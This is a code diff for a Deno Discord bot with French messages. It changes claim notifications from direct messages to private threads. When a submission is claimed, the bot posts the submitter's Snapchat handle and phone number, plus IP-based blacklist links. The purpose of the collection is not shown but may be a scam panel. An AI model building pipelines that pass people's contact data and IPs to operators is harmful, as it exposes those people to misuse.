@@ -32,25 +32,39 @@ async function verifyRequest(signature, timestamp, body) {
   }
 }
 
-async function sendDM(userId, content) {
-  const dmRes = await fetch("https://discord.com/api/v10/users/@me/channels", {
+async function createPrivateThread(messageId, channelId, userId, content, snapchat) {
+  // Create a private thread
+  const threadRes = await fetch(`https://discord.com/api/v10/channels/${channelId}/messages/${messageId}/threads`, {
     method: "POST",
     headers: {
       "Authorization": `Bot ${BOT_TOKEN}`,
       "Content-Type": "application/json"
     },
-    body: JSON.stringify({ recipient_id: userId })
+    body: JSON.stringify({
+      name: `🎯 ${snapchat}`,
+      type: 12,
+      invitable: false,
+      auto_archive_duration: 60
+    })
   });
-  const dmData = await dmRes.json();
-  if (!dmData.id) throw new Error("Failed to create DM channel");
+  
+  const threadData = await threadRes.json();
+  if (!threadData.id) throw new Error("Failed to create thread");
 
-  await fetch(`https://discord.com/api/v10/channels/${dmData.id}/messages`, {
+  // Post the content in the thread
+  await fetch(`https://discord.com/api/v10/channels/${threadData.id}/messages`, {
     method: "POST",
     headers: {
       "Authorization": `Bot ${BOT_TOKEN}`,
       "Content-Type": "application/json"
     },
     body: JSON.stringify({ content })
+  });
+
+  // Add the user to the thread
+  await fetch(`https://discord.com/api/v10/channels/${threadData.id}/thread_members/${userId}`, {
+    method: "PUT",
+    headers: { "Authorization": `Bot ${BOT_TOKEN}` }
   });
 }
 
@@ -124,8 +138,8 @@ Deno.serve(async (req) => {
         const waitUrl = `${APP_URL}/?triggerAction=wait&id=${submissionId}`;
         const blacklistUrl = `${APP_URL}/?triggerAction=blacklist&id=${submissionId}&ip=${encodeURIComponent(submission.ip_address || "")}`;
 
-        const dmContent = [
-          `🎯 **Tu as pris en charge une soumission!**`,
+        const threadContent = [
+          `🎯 **Tu as pris en charge cette soumission!**`,
           ``,
           `👻 Snapchat: **@${submission.snapchat}**`,
           `📞 Numéro: **${submission.telephone}**`,
@@ -140,7 +154,7 @@ Deno.serve(async (req) => {
           `🚫 [Blacklist instant](${blacklistUrl})`
         ].join("\n");
 
-        await sendDM(userId, dmContent);
+        await createPrivateThread(msg.id, channel_id, userId, threadContent, submission.snapchat);
       } catch (e) {
         console.error("Error processing claim:", e.message);
       }
